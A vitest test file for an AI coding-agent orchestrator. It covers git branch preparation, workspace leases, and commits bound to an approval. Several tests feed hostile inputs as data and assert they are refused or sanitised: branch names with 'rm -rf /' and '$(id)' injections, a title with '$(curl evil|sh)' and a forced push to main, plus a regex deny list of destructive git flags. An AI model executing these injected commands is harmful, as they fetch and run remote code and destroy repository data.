import { describe, expect, it } from "vitest";
import { planBranch } from "../branches/planner";
import type { BranchPlanRequest, NewBranchPlan, ReuseBranchPlan } from "../branches/types";
import { createClaudeCodeAdapter } from "../workers/claudeCode";
import { createFakeGit, createFakePromptFiles, createFakeRunner, createFakeTimer, FAKE_GIT_METADATA_DIGEST } from "../workers/fake";
import { gitBlobId, type PathContentIdentity } from "../workers/gitIntegrity";
import type { GitInspector, GitStatus, ProcessExit, ProcessRunner, ProcessSpec, WorkerTaskContract } from "../workers/types";
import { COMMIT_PUBLISH_ACTION, commitApprovalBinding, type CommitApprovalEvidence } from "../workers/prompt";
import type { Approval } from "../store/types";
import { assignWorkerBranch } from "./flow";
import { createWorkspaceLeaseRegistry } from "./lease";
import {
  buildCreateSwitchArgs,
  buildFetchArgs,
  buildResolveArgs,
  buildSwitchArgs,
  checkWorkerPreconditions,
  commitValidatedChanges,
  COMMIT_GIT_SUBCOMMANDS,
  isPreparedWorkspace,
  prepareAssignedWorkspace,
  WORKSPACE_GIT_SUBCOMMANDS,
} from "./workspace";

const BASE = "a".repeat(40);
const HEAD = "b".repeat(40);
const MOVED = "e".repeat(40);
const ROOT = "/workspaces/oxm-platform";
const NEW_BRANCH = "agent/task-t1-fix-search";
const REUSE_BRANCH = "agent/task-root1-epic";

const req = (over: Partial<BranchPlanRequest> = {}): BranchPlanRequest => ({
  taskId: "t1",
  category: "bug_fix",
  title: "Fix search",
  expectedPaths: ["client/src/pages/Search.tsx"],
  baseBranch: "main",
  baseSha: BASE,
  ...over,
});

const newPlan = () => planBranch(req(), { active: [] }) as NewBranchPlan;
const reusePlan = () =>
  planBranch(
    req({
      taskId: "t2",
      lineage: { rootTaskId: "root1", title: "Epic" },
      allowReuse: true,
      existingBranch: {
        name: REUSE_BRANCH,
        headSha: HEAD,
        baseSha: BASE,
        lineageId: "root1",
        prNumber: 7,
        prState: "open",
        changedPaths: ["client/src/pages/Search.tsx"],
        workerRunning: false,
      },
    }),
    { active: [] },
  ) as ReuseBranchPlan;

interface FakeRepo {
  current: string; // branch name or "HEAD" when detached
  detachedSha: string;
  local: Map<string, string>;
  remote: Map<string, string>;
  tracking: Map<string, string>;
  dirty: string[];
  staged?: string[];
  committedPaths?: string[];
  /** Working-tree bytes of dirty paths (null = deleted); unlisted dirty paths read as `wt:<path>`. */
  files?: Map<string, string | null>;
  /** Index blobs written by `git add` for the staged paths. */
  index?: Map<string, string>;
  /** Current Git metadata digest. */
  meta?: string;
  /** Simulates something writing the tree while `git add` runs. */
  onAdd?: () => void;
  /** Simulates a clean filter: what `git hash-object` reports instead of the raw blob. */
  filtered?: Map<string, string>;
  /** When set, `switch` reports success but does not move (simulates a lying/failed switch). */
  brokenSwitch?: boolean;
}

/** Fake git over an in-memory repo: interprets only the argv this module may emit. */
function fakeGit(repo: FakeRepo) {
  const specs: ProcessSpec[] = [];
  const bytesOf = (path: string): string | null => (repo.files?.has(path) ? repo.files.get(path)! : `wt:${path}`);
  const exit = (e: Partial<ProcessExit>) => ({
    exit: Promise.resolve({ exitCode: 0, signal: null, stdout: "", stderr: "", truncated: false, ...e }),
    kill() {},
  });
  const runner: ProcessRunner = {
    spawn(spec) {
      specs.push({ ...spec, args: [...spec.args] });
      const a = spec.args;
      if (spec.command !== "git") return exit({ exitCode: 127 });
      if (a[0] === "fetch") {
        const [src, dst] = a[a.length - 1].split(":");
        const b = src.replace("refs/heads/", "");
        if (!repo.remote.has(b) || dst !== `refs/remotes/origin/${b}`) return exit({ exitCode: 128 });
        repo.tracking.set(b, repo.remote.get(b)!);
        return exit({});
      }
      if (a[0] === "rev-parse") {
        const ref = a[a.length - 1].replace("^{commit}", "");
        const sha = ref.startsWith("refs/heads/")
          ? repo.local.get(ref.slice("refs/heads/".length))
          : repo.tracking.get(ref.slice("refs/remotes/origin/".length));
        return sha ? exit({ stdout: `${sha}\n` }) : exit({ exitCode: 1 });
      }
      if (a[0] === "switch" && a.includes("--create")) {
        const [b, sha] = a.slice(-2);
        if (repo.local.has(b)) return exit({ exitCode: 128 });
        repo.local.set(b, sha);
        if (!repo.brokenSwitch) repo.current = b;
        return exit({});
      }
      if (a[0] === "switch") {
        const b = a[a.length - 1];
        if (!repo.local.has(b)) return exit({ exitCode: 128 });
        if (!repo.brokenSwitch) repo.current = b;
        return exit({});
      }
      if (a[0] === "add") {
        repo.staged = a.slice(a.indexOf("--") + 1);
        repo.index = new Map();
        for (const path of repo.staged) {
          const bytes = bytesOf(path);
          if (bytes !== null) repo.index.set(path, repo.filtered?.get(path) ?? gitBlobId(Buffer.from(bytes)));
        }
        repo.onAdd?.();
        return exit({});
      }
      if (a[0] === "ls-files") {
        const out = a.slice(a.indexOf("--") + 1).flatMap((path) => (repo.index?.has(path) ? [`100644 ${repo.index.get(path)} 0\t${path}\0`] : []));
        return exit({ stdout: out.join("") });
      }
      if (a[0] === "hash-object") {
        const out = a.slice(a.indexOf("--") + 1).map((path) => {
          const bytes = bytesOf(path);
          return bytes === null ? "" : `${repo.filtered?.get(path) ?? gitBlobId(Buffer.from(bytes))}\n`;
        });
        return out.includes("") ? exit({ exitCode: 128 }) : exit({ stdout: out.join("") });
      }
      if (a[0] === "diff" && a.includes("--cached")) return exit({ stdout: `${(repo.staged ?? []).join("\0")}\0` });
      if (a[0] === "commit") {
        repo.committedPaths = [...(repo.staged ?? [])];
        repo.staged = [];
        repo.dirty = [];
        repo.local.set(repo.current, MOVED);
        return exit({});
      }
      return exit({ exitCode: 99 });
    },
  };
  const status = (): GitStatus => ({
    branch: repo.current,
    headSha: repo.current === "HEAD" ? repo.detachedSha : repo.local.get(repo.current) ?? "",
    dirtyPaths: [...repo.dirty],
  });
  const git: GitInspector = {
    status: async () => status(),
    changedPathsSince: async (fromSha) => status().headSha === fromSha ? [...repo.dirty] : [...(repo.committedPaths ?? [])],
    contentIdentities: async (paths) =>
      Array.from(new Set(paths)).sort().map((path): PathContentIdentity => {
        const bytes = bytesOf(path);
        return bytes === null ? { path, mode: "absent", blob: null } : { path, mode: "100644", blob: gitBlobId(Buffer.from(bytes)) };
      }),
    metadataDigest: async () => repo.meta ?? FAKE_GIT_METADATA_DIGEST,
  };
  return { runner, git, specs, status };
}

function setup(plan: NewBranchPlan | ReuseBranchPlan, repoOver: Partial<FakeRepo> = {}) {
  const repo: FakeRepo = {
    current: "main",
    detachedSha: BASE,
    local: new Map([["main", BASE]]),
    remote: new Map([["main", BASE], [NEW_BRANCH, BASE], [REUSE_BRANCH, HEAD]]),
    tracking: new Map(),
    dirty: [],
    ...repoOver,
  };
  const g = fakeGit(repo);
  const leases = createWorkspaceLeaseRegistry();
  const leaseRes = leases.acquire({ workspaceId: "ws-1", taskId: plan.taskId, lineageId: plan.lineageId, branch: plan.branch });
  if (!leaseRes.ok) throw new Error(leaseRes.reason);
  const deps = { runner: g.runner, git: g.git, repoRoot: ROOT, leases };
  const creation = plan.decision === "new_branch" ? { taskId: plan.taskId, branch: plan.branch, baseSha: plan.baseSha, alreadyExisted: false } : null;
  return { repo, ...g, leases, lease: leaseRes.lease, deps, creation };
}

const contractFor = (taskId: string): Omit<WorkerTaskContract, "branch"> => ({
  taskId,
  runId: "run-1",
  category: "bug_fix",
  actions: [{ kind: "code_edit" }],
  objective: "fix",
  allowedScope: ["client/"],
  acceptanceCriteria: [],
  requiredValidations: ["tests"],
});

const FORBIDDEN_GIT = /^(reset|merge|rebase|clean|checkout|push|branch|pull|cherry-pick|update-ref|stash|restore)$/;
const assertSafeArgv = (specs: ProcessSpec[]) => {
  for (const s of specs) {
    expect(s.command).toBe("git");
    expect(WORKSPACE_GIT_SUBCOMMANDS as readonly string[]).toContain(s.args[0]);
    expect(s.args[0]).not.toMatch(FORBIDDEN_GIT);
    for (const arg of s.args) {
      expect(arg).not.toMatch(/^--(force|hard|discard-changes|merge|force-create)$|^-[fCB]$|^\+|refs\/heads\/(main|master)\b/);
    }
    expect(s.args).not.toContain("main");
    expect(s.args).not.toContain("master");
  }
};

describe("prepareAssignedWorkspace: new branch", () => {
  it("fetches the exact branch, creates it locally at the planned base SHA, and verifies", async () => {
    const plan = newPlan();
    const s = setup(plan);
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps);
    expect(res).toMatchObject({ ok: true, prepared: { taskId: "t1", branch: NEW_BRANCH, headSha: BASE, workspaceId: "ws-1" } });
    expect(s.specs.map((x) => x.args)).toEqual([
      ["fetch", "--no-tags", "--no-recurse-submodules", "origin", `refs/heads/${NEW_BRANCH}:refs/remotes/origin/${NEW_BRANCH}`],
      ["rev-parse", "--verify", "--quiet", `refs/remotes/origin/${NEW_BRANCH}^{commit}`],
      ["rev-parse", "--verify", "--quiet", `refs/heads/${NEW_BRANCH}^{commit}`],
      ["switch", "--no-track", "--create", NEW_BRANCH, BASE],
    ]);
    expect(s.specs.every((x) => x.cwd === ROOT)).toBe(true);
    assertSafeArgv(s.specs);
    expect(s.status()).toEqual({ branch: NEW_BRANCH, headSha: BASE, dirtyPaths: [] });
  });

  it("requires the branch to have been created (matching the plan) first", async () => {
    const plan = newPlan();
    const s = setup(plan);
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps)).toMatchObject({ error: "policy_violation" });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: { ...s.creation!, baseSha: MOVED } }, s.deps)).toMatchObject({ error: "policy_violation" });
    expect(s.specs).toHaveLength(0);
  });

  it("missing remote branch → branch_missing", async () => {
    const plan = newPlan();
    const s = setup(plan);
    s.repo.remote.delete(NEW_BRANCH);
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "branch_missing" });
    expect(s.repo.current).toBe("main");
  });
});

describe("prepareAssignedWorkspace: reuse branch", () => {
  it("switches to an existing local branch already at the plan's accepted head", async () => {
    const plan = reusePlan();
    const s = setup(plan, { local: new Map([["main", BASE], [REUSE_BRANCH, HEAD]]) });
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps);
    expect(res).toMatchObject({ ok: true, prepared: { branch: REUSE_BRANCH, headSha: HEAD, taskId: "t2" } });
    expect(s.specs.at(-1)?.args).toEqual(["switch", "--no-guess", REUSE_BRANCH]);
    assertSafeArgv(s.specs);
  });

  it("creates the local branch at the accepted head when absent", async () => {
    const plan = reusePlan();
    const s = setup(plan);
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps)).toMatchObject({ ok: true, prepared: { headSha: HEAD } });
    expect(s.specs.at(-1)?.args).toEqual(["switch", "--no-track", "--create", REUSE_BRANCH, HEAD]);
  });

  it("does not switch when already on the branch at the right SHA", async () => {
    const plan = reusePlan();
    const s = setup(plan, { current: REUSE_BRANCH, local: new Map([[REUSE_BRANCH, HEAD]]) });
    expect((await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps)).ok).toBe(true);
    expect(s.specs.some((x) => x.args[0] === "switch")).toBe(false);
  });

  it("remote moved unexpectedly → remote_moved (fail closed, no switch)", async () => {
    const plan = reusePlan();
    const s = setup(plan);
    s.repo.remote.set(REUSE_BRANCH, MOVED);
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps);
    expect(res).toMatchObject({ ok: false, error: "remote_moved", reason: expect.stringMatching(/re-plan required/) });
    expect(s.specs.some((x) => x.args[0] === "switch")).toBe(false);
    expect(s.repo.current).toBe("main");
  });

  it("new branch whose remote is not at the base SHA → remote_moved", async () => {
    const plan = newPlan();
    const s = setup(plan);
    s.repo.remote.set(NEW_BRANCH, MOVED);
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "remote_moved" });
  });

  it("local branch at a different SHA → local_diverged; never moved/reset", async () => {
    const plan = reusePlan();
    const s = setup(plan, { local: new Map([["main", BASE], [REUSE_BRANCH, MOVED]]) });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps)).toMatchObject({ error: "local_diverged" });
    expect(s.repo.local.get(REUSE_BRANCH)).toBe(MOVED);
    expect(s.specs.some((x) => x.args[0] === "switch")).toBe(false);
  });
});

describe("prepareAssignedWorkspace: preflight refusals", () => {
  it("detached HEAD → detached_head before any git op", async () => {
    const plan = newPlan();
    const s = setup(plan, { current: "HEAD" });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "detached_head" });
    expect(s.specs).toHaveLength(0);
  });

  it("dirty worktree → dirty_worktree; explicitly allowed dirty paths pass", async () => {
    const plan = newPlan();
    const s = setup(plan, { dirty: ["server/secret-wip.ts"] });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "dirty_worktree" });
    expect(s.specs).toHaveLength(0);
    const ok = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation, allowedDirtyPaths: ["server/secret-wip.ts"] }, s.deps);
    expect(ok.ok).toBe(true);
  });

  it("wrong current branch after switching → verification_failed", async () => {
    const plan = newPlan();
    const s = setup(plan, { brokenSwitch: true });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "verification_failed" });
  });

  it("plans not created by the planner (copied, forged, protected, queue/reject) are refused", async () => {
    const plan = newPlan();
    const s = setup(plan);
    for (const p of [
      { ...plan },
      Object.freeze({ ...plan, branch: "main" }),
      Object.freeze({ ...plan, branch: "master" }),
      planBranch(req({ requestedBranch: "main" }), { active: [] }),
      null,
    ]) {
      expect(await prepareAssignedWorkspace({ plan: p, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "policy_violation" });
    }
    expect(s.specs).toHaveLength(0);
  });

  it("protected branches cannot even be leased", () => {
    const leases = createWorkspaceLeaseRegistry();
    for (const branch of ["main", "master", "refs/heads/main"]) {
      expect(leases.acquire({ workspaceId: "ws", taskId: "t1", lineageId: "t1", branch }).ok).toBe(false);
    }
  });

  it("lease conflict: task B cannot prepare a workspace leased to task A", async () => {
    const planA = newPlan();
    const s = setup(planA);
    const planB = planBranch(req({ taskId: "t2", title: "Other", expectedPaths: ["server/x.ts"] }), { active: [] }) as NewBranchPlan;
    expect(s.leases.acquire({ workspaceId: "ws-1", taskId: "t2", lineageId: "t2", branch: planB.branch })).toMatchObject({ error: "lease_conflict" });
    const creationB = { taskId: "t2", branch: planB.branch, baseSha: BASE, alreadyExisted: false };
    expect(await prepareAssignedWorkspace({ plan: planB, lease: s.lease, creation: creationB }, s.deps)).toMatchObject({ error: "lease_conflict" });
    expect(await prepareAssignedWorkspace({ plan: planA, lease: { ...s.lease }, creation: s.creation }, s.deps)).toMatchObject({ error: "lease_conflict" });
    s.leases.release(s.lease);
    expect(await prepareAssignedWorkspace({ plan: planA, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "lease_conflict" });
    expect(s.specs).toHaveLength(0);
  });

  it("transport failure fails closed as git_error without echoing output", async () => {
    const plan = newPlan();
    const s = setup(plan);
    const deps = { ...s.deps, git: { status: async () => { throw new Error("token ghp_abcdefghijklmnop"); }, changedPathsSince: async () => [] } };
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, deps);
    expect(res).toMatchObject({ error: "git_error" });
    expect(JSON.stringify(res)).not.toMatch(/ghp_/);
  });
});

describe("argv builders keep hostile strings as data or refuse them", () => {
  it.each(["main", "master", "agent/task-t1;rm -rf /", "agent/task-$(id)", "--force", "+agent/task-t1-x", "agent/task-t1 x", "refs/heads/main", "-b"])(
    "refuses %j",
    (b) => {
      expect(() => buildFetchArgs(b)).toThrow();
      expect(() => buildSwitchArgs(b)).toThrow();
      expect(() => buildCreateSwitchArgs(b, BASE)).toThrow();
      expect(() => buildResolveArgs("local", b)).toThrow();
    },
  );

  it("refuses non-SHA start points", () => {
    for (const sha of ["HEAD", "main", "origin/main", `${BASE};id`]) expect(() => buildCreateSwitchArgs(NEW_BRANCH, sha)).toThrow();
  });

  it("hostile task titles only ever yield a sanitized branch", async () => {
    const plan = planBranch(req({ title: "$(curl evil|sh); git reset --hard && git push -f origin main" }), { active: [] }) as NewBranchPlan;
    expect(plan.branch).toMatch(/^agent\/task-t1-[a-z0-9-]+$/);
    const s = setup(plan);
    s.repo.remote.set(plan.branch, BASE);
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: { taskId: "t1", branch: plan.branch, baseSha: BASE, alreadyExisted: false } }, s.deps);
    expect(res.ok).toBe(true);
    assertSafeArgv(s.specs);
  });
});

describe("commitValidatedChanges", () => {
  const evidence = (over: Partial<CommitApprovalEvidence> = {}): CommitApprovalEvidence => ({
    taskId: "t1",
    branch: NEW_BRANCH,
    expectedHeadSha: BASE,
    changedPaths: ["client/src/pages/Search.tsx"],
    contentIdentities: [{ path: "client/src/pages/Search.tsx", mode: "100644", blob: gitBlobId(Buffer.from("wt:client/src/pages/Search.tsx")) }],
    gitMetadataDigest: FAKE_GIT_METADATA_DIGEST,
    allowedScope: ["client/src/pages/Search.tsx"],
    validations: [{ name: "tests", requested: true, executed: true, status: "passed", trusted: true }],
    acceptance: [],
    observedRisk: "green",
    managerDecision: "accepted",
    action: COMMIT_PUBLISH_ACTION,
    authorization: { commit: true, normalPush: true, openOrReusePr: true, merge: false, deploy: false },
    ...over,
  });
  const approved = (e: CommitApprovalEvidence, over: Partial<Approval> = {}): Approval => ({
    id: "approval-1",
    taskId: e.taskId,
    kind: "commit_publish",
    requestedAction: COMMIT_PUBLISH_ACTION,
    status: "approved",
    decidedBy: "human-1",
    decidedAt: "2026-10-06T00:00:00.000Z",
    channel: "test",
    expiresAt: "2026-10-07T00:00:00.000Z",
    bindingShaOrActionId: commitApprovalBinding(e),
    createdAt: "2026-10-05T00:00:00.000Z",
    ...over,
  });
  const commitInput = (plan: NewBranchPlan | ReuseBranchPlan, lease: unknown, e = evidence()) => ({
    plan,
    lease,
    evidence: e,
    approval: approved(e),
    at: "2026-10-06T12:00:00.000Z",
  });

  async function ready(dirty = ["client/src/pages/Search.tsx"]) {
    const plan = newPlan();
    const s = setup(plan);
    const prepared = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps);
    if (!prepared.ok) throw new Error(prepared.reason);
    s.repo.dirty = [...dirty];
    s.specs.length = 0;
    return { plan, s };
  }

  it("creates exactly one trusted commit containing only Git-observed in-scope paths", async () => {
    const { plan, s } = await ready();
    const result = await commitValidatedChanges(commitInput(plan, s.lease), s.deps);
    expect(result).toEqual({ ok: true, headSha: MOVED });
    expect(s.status()).toEqual({ branch: NEW_BRANCH, headSha: MOVED, dirtyPaths: [] });
    expect(s.repo.committedPaths).toEqual(["client/src/pages/Search.tsx"]);
    expect(s.specs.map((spec) => spec.args[0])).toEqual(["diff", "add", "diff", "ls-files", "hash-object", "commit"]);
    const commits = s.specs.filter((spec) => spec.args[0] === "commit");
    expect(commits).toHaveLength(1);
    // No pathspec: the commit takes exactly the verified index, never re-reading the working tree.
    expect(commits[0].args).toEqual(["commit", "--no-verify", "--message", "chore(agent): apply task t1"]);
    expect(s.specs.filter((spec) => spec.args[0] === "diff").every((spec) => spec.args.includes("--no-renames"))).toBe(true);
    expect(s.specs.every((spec) => (COMMIT_GIT_SUBCOMMANDS as readonly string[]).includes(spec.args[0]))).toBe(true);
  });

  it("fails closed before staging when foreign or unowned dirty paths are present", async () => {
    const { plan, s } = await ready(["client/src/pages/Search.tsx", "server/foreign.ts"]);
    const result = await commitValidatedChanges(commitInput(plan, s.lease), s.deps);
    expect(result).toMatchObject({ ok: false, error: "dirty_worktree" });
    expect(s.specs).toHaveLength(0);
    expect(s.status().headSha).toBe(BASE);
  });

  it("fails closed without git add when any path was already staged", async () => {
    const { plan, s } = await ready();
    s.repo.staged = ["client/src/pages/Search.tsx"];
    const result = await commitValidatedChanges(commitInput(plan, s.lease), s.deps);
    expect(result).toMatchObject({ ok: false, error: "dirty_worktree" });
    expect(s.specs.map((spec) => spec.args[0])).toEqual(["diff"]);
    expect(s.status().headSha).toBe(BASE);
  });

  it("refuses out-of-scope paths, moved heads, forged plans, and protected branches", async () => {
    const { plan, s } = await ready();
    const outside = evidence({ allowedScope: ["server/"] });
    expect(await commitValidatedChanges({ ...commitInput(plan, s.lease, outside), approval: approved(outside) }, s.deps)).toMatchObject({ ok: false, error: "policy_violation" });
    const moved = evidence({ expectedHeadSha: HEAD });
    expect(await commitValidatedChanges(commitInput(plan, s.lease, moved), s.deps)).toMatchObject({ ok: false, error: "verification_failed" });
    expect(await commitValidatedChanges(commitInput({ ...plan } as NewBranchPlan, s.lease), s.deps)).toMatchObject({ ok: false, error: "policy_violation" });
    expect(await commitValidatedChanges(commitInput(Object.freeze({ ...plan, branch: "main" }) as NewBranchPlan, s.lease), s.deps)).toMatchObject({ ok: false, error: "policy_violation" });
    expect(s.specs).toHaveLength(0);
  });
});

describe("commitValidatedChanges binds approved bytes and Git metadata", () => {
  const PATH = "client/src/pages/Search.tsx";
  const APPROVED = "export const page = 1;\n";
  const blob = (bytes: string) => gitBlobId(Buffer.from(bytes));
  const evidence = (over: Partial<CommitApprovalEvidence> = {}): CommitApprovalEvidence => ({
    taskId: "t1",
    branch: NEW_BRANCH,
    expectedHeadSha: BASE,
    changedPaths: [PATH],
    contentIdentities: [{ path: PATH, mode: "100644", blob: blob(APPROVED) }],
    gitMetadataDigest: FAKE_GIT_METADATA_DIGEST,
    allowedScope: ["client/"],
    validations: [{ name: "tests", requested: true, executed: true, status: "passed", trusted: true }],
    acceptance: [],
    observedRisk: "green",
    managerDecision: "accepted",
    action: COMMIT_PUBLISH_ACTION,
    authorization: { commit: true, normalPush: true, openOrReusePr: true, merge: false, deploy: false },
    ...over,
  });
  const approval = (e: CommitApprovalEvidence): Approval => ({
    id: "approval-1",
    taskId: e.taskId,
    kind: "commit_publish",
    requestedAction: COMMIT_PUBLISH_ACTION,
    status: "approved",
    decidedBy: "human-1",
    decidedAt: "2026-10-06T00:00:00.000Z",
    channel: "test",
    expiresAt: "2026-10-07T00:00:00.000Z",
    bindingShaOrActionId: commitApprovalBinding(e),
    createdAt: "2026-10-05T00:00:00.000Z",
  });
  async function approvedWorkspace(e = evidence()) {
    const plan = newPlan();
    const s = setup(plan);
    const prepared = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps);
    if (!prepared.ok) throw new Error(prepared.reason);
    s.repo.dirty = [PATH];
    s.repo.files = new Map([[PATH, APPROVED]]);
    s.specs.length = 0;
    const commit = () => commitValidatedChanges({ plan, lease: s.lease, evidence: e, approval: approval(e), at: "2026-10-06T12:00:00.000Z" }, s.deps);
    return { s, commit };
  }
  const gitOps = (specs: ProcessSpec[]) => specs.map((spec) => spec.args[0]);

  it("the binding covers path + content identity + metadata, so any change yields a different approval identity", () => {
    const base = commitApprovalBinding(evidence());
    expect(commitApprovalBinding(evidence({ contentIdentities: [{ path: PATH, mode: "100644", blob: blob("export const page = 2;\n") }] }))).not.toBe(base);
    expect(commitApprovalBinding(evidence({ contentIdentities: [{ path: PATH, mode: "100755", blob: blob(APPROVED) }] }))).not.toBe(base);
    expect(commitApprovalBinding(evidence({ contentIdentities: [{ path: PATH, mode: "absent", blob: null }] }))).not.toBe(base);
    expect(commitApprovalBinding(evidence({ gitMetadataDigest: "e".repeat(64) }))).not.toBe(base);
  });

  it("unchanged approved bytes => exactly one trusted commit", async () => {
    const { s, commit } = await approvedWorkspace();
    expect(await commit()).toEqual({ ok: true, headSha: MOVED });
    expect(gitOps(s.specs).filter((op) => op === "commit")).toHaveLength(1);
    expect(s.repo.committedPaths).toEqual([PATH]);
  });

  it("same path, different contents after approval => stale, nothing staged", async () => {
    const { s, commit } = await approvedWorkspace();
    s.repo.files!.set(PATH, "export const page = 1;\nexport const evil = true;\n");
    expect(await commit()).toMatchObject({ ok: false, error: "verification_failed", reason: expect.stringMatching(/content changed after approval/) });
    expect(s.specs).toHaveLength(0);
    expect(s.status().headSha).toBe(BASE);
  });

  it("a one-byte change (same length) after approval => stale", async () => {
    const { s, commit } = await approvedWorkspace();
    s.repo.files!.set(PATH, "export const page = 2;\n");
    expect(await commit()).toMatchObject({ ok: false, error: "verification_failed" });
    expect(gitOps(s.specs)).not.toContain("add");
  });

  it("deletion of an approved file after approval => stale", async () => {
    const { s, commit } = await approvedWorkspace();
    s.repo.files!.set(PATH, null);
    expect(await commit()).toMatchObject({ ok: false, error: "verification_failed" });
    expect(gitOps(s.specs)).not.toContain("add");
  });

  it("rename after approval (approved path gone, new path appears) => refused before staging", async () => {
    const { s, commit } = await approvedWorkspace();
    s.repo.files!.set(PATH, null);
    s.repo.files!.set("client/src/pages/Renamed.tsx", APPROVED);
    s.repo.dirty = [PATH, "client/src/pages/Renamed.tsx"];
    expect(await commit()).toMatchObject({ ok: false, error: "dirty_worktree" });
    expect(s.specs).toHaveLength(0);
  });

  it("Git metadata drift after approval (config/hooks/attributes) => stale", async () => {
    const { s, commit } = await approvedWorkspace();
    s.repo.meta = "e".repeat(64);
    expect(await commit()).toMatchObject({ ok: false, error: "verification_failed", reason: expect.stringMatching(/Git metadata changed/) });
    expect(s.specs).toHaveLength(0);
  });

  it("bytes changing while git add runs => refused before commit", async () => {
    const { s, commit } = await approvedWorkspace();
    s.repo.onAdd = () => s.repo.files!.set(PATH, "export const page = 3;\n");
    expect(await commit()).toMatchObject({ ok: false, error: "verification_failed" });
    expect(gitOps(s.specs)).not.toContain("commit");
  });

  it("a staged blob that differs from Git's hash of the approved file => refused before commit", async () => {
    const { s, commit } = await approvedWorkspace();
    s.repo.onAdd = () => s.repo.index!.set(PATH, blob("tampered index"));
    expect(await commit()).toMatchObject({ ok: false, error: "verification_failed", reason: expect.stringMatching(/staged content/) });
    expect(gitOps(s.specs)).not.toContain("commit");
  });

  it("approved deletions are committed only when the index drops the path", async () => {
    const e = evidence({ contentIdentities: [{ path: PATH, mode: "absent", blob: null }] });
    const { s, commit } = await approvedWorkspace(e);
    s.repo.files!.set(PATH, null);
    expect(await commit()).toEqual({ ok: true, headSha: MOVED });
    expect(gitOps(s.specs)).not.toContain("hash-object");
  });

  it("evidence that does not cover exactly the changed paths, or lacks a metadata baseline, is refused", async () => {
    const missing = evidence({ contentIdentities: [] });
    expect(await (await approvedWorkspace(missing)).commit()).toMatchObject({ ok: false, error: "policy_violation" });
    const extra = evidence({ contentIdentities: [...evidence().contentIdentities, { path: "client/other.ts", mode: "absent", blob: null }] });
    expect(await (await approvedWorkspace(extra)).commit()).toMatchObject({ ok: false, error: "policy_violation" });
    const noMeta = evidence({ gitMetadataDigest: "" });
    expect(await (await approvedWorkspace(noMeta)).commit()).toMatchObject({ ok: false, error: "policy_violation" });
  });

  it("a second attempt with the same approval cannot create a second commit", async () => {
    const { s, commit } = await approvedWorkspace();
    expect((await commit()).ok).toBe(true);
    const again = await commit();
    expect(again).toMatchObject({ ok: false, error: "verification_failed" });
    expect(gitOps(s.specs).filter((op) => op === "commit")).toHaveLength(1);
  });
});

describe("worker preconditions", () => {
  async function prepared() {
    const plan = newPlan();
    const s = setup(plan);
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps);
    if (!res.ok) throw new Error(res.reason);
    const assigned = assignWorkerBranch(contractFor("t1"), plan);
    if (!assigned.ok) throw new Error(assigned.reason);
    return { plan, s, prepared: res.prepared, contract: assigned.contract };
  }

  it("a prepared workspace satisfies the worker's branch/HEAD preconditions end to end", async () => {
    const { plan, s, prepared: p, contract } = await prepared();
    expect(isPreparedWorkspace(p)).toBe(true);
    expect(p.gitMetadataDigest).toBe(FAKE_GIT_METADATA_DIGEST);
    const gate = checkWorkerPreconditions({ prepared: p, plan, contract, status: s.status(), metadataDigest: FAKE_GIT_METADATA_DIGEST, leases: s.leases, lease: s.lease });
    expect(gate).toMatchObject({ ok: true, contract: { branch: NEW_BRANCH, expectedHeadSha: BASE, gitMetadataDigest: FAKE_GIT_METADATA_DIGEST } });
    if (!gate.ok) return;

    // The real adapter's own preflight accepts the bound contract on the prepared tree (fake process/git).
    const report = {
      status: "success", summary: "ok", filesChanged: ["client/x.ts"], testsRun: [{ command: "pnpm test", outcome: "passed" }],
      checkResult: "passed", branch: NEW_BRANCH, headSha: BASE, prNumber: null, riskObserved: { level: "green", notes: [] },
      needsApproval: false, fallbackRecommended: false, errorType: null,
    };
    const envelope = JSON.stringify({ type: "result", subtype: "success", is_error: false, result: JSON.stringify(report) });
    const runner = createFakeRunner(() => ({ exit: { stdout: envelope } }));
    const git = createFakeGit([s.status(), { branch: NEW_BRANCH, headSha: BASE, dirtyPaths: ["client/x.ts"] }], ["client/x.ts"]);
    const adapter = createClaudeCodeAdapter({ model: "claude-opus-5-5", repoRoot: ROOT, timeoutMs: 60_000 }, { runner, git, promptFiles: createFakePromptFiles(), timer: createFakeTimer() });
    const result = await adapter.start({ contract: gate.contract, now: "2026-10-04T00:00:00.000Z" }).result;
    expect(result).toMatchObject({ status: "success", branch: NEW_BRANCH, prNumber: null });
    // The worker itself never ran git switch/fetch: only the claude process was spawned.
    expect(runner.specs.map((x) => x.command)).toEqual(["claude"]);
  });

  it("fails closed when the workspace drifted, lease was lost, or the proof is forged", async () => {
    const { plan, s, prepared: p, contract } = await prepared();
    const base = { prepared: p, plan, contract, status: s.status(), metadataDigest: FAKE_GIT_METADATA_DIGEST, leases: s.leases, lease: s.lease };
    expect(checkWorkerPreconditions(base).ok).toBe(true);
    expect(checkWorkerPreconditions({ ...base, metadataDigest: "e".repeat(64) })).toMatchObject({ ok: false, reason: "Git metadata changed since preparation" });
    expect(checkWorkerPreconditions({ ...base, contract: { ...contract, gitMetadataDigest: "e".repeat(64) } }).ok).toBe(false);
